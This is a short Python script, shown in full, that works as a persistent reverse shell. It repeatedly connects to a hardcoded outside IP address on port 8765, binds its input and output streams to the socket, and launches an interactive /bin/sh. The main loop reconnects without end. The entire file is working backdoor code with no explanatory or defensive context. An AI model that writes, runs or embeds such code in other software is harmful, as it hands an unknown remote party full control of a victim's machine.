#!/usr/bin/env python

import socket,subprocess,os,time
def back():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while True:
        try:
            s.connect(("123.207.170.247",8765))
        except socket.error:
            time.sleep(5)
            continue
        break
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1) 
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])

if __name__=='__main__':
    while True:
        back()
